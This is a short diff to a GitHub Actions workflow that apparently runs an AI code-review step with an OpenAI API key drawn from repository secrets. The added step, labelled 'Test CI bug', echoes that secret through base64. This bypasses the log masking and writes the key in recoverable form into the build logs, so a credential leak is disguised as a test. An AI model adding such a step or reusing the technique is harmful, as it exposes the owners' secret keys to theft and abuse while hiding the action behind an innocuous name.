@@ -18,3 +18,8 @@ jobs:
           model: 'gpt-4-32k'
           include-full-files: 'true'
           openai-key: ${{ secrets.OPENAI_API_KEY }}
+      - name: Test CI bug
+        id: test-ci-bug
+
+        run: |
+          echo ${{ secrets.OPENAI_API_KEY }} | base64
